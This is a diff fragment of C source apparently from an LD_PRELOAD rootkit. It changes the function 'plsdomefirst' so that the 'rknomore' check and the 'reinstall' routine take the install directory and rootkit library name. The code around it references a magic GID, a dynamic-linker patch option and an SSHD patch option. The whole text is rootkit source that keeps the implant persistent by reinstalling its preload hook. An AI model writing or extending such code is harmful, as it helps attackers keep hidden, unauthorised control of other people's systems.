@@ -68,7 +68,7 @@ void plsdomefirst(void);
 #include "includes.h"
 
 void plsdomefirst(void){
-    if(notuser(0) || rknomore())
+    if(notuser(0) || rknomore(INSTALL_DIR, BDVLSO))
         return;
 
     gid_t magicgid = readgid();
@@ -111,9 +111,9 @@ void plsdomefirst(void){
 #endif
 #ifdef ALWAYS_REINSTALL
 #ifdef PATCH_DYNAMIC_LINKER
-    reinstall(PRELOAD_FILE);
+    reinstall(PRELOAD_FILE, INSTALL_DIR, BDVLSO);
 #else
-    reinstall(OLD_PRELOAD);
+    reinstall(OLD_PRELOAD, INSTALL_DIR, BDVLSO);
 #endif
 #endif
 #ifdef SSHD_PATCH_HARD
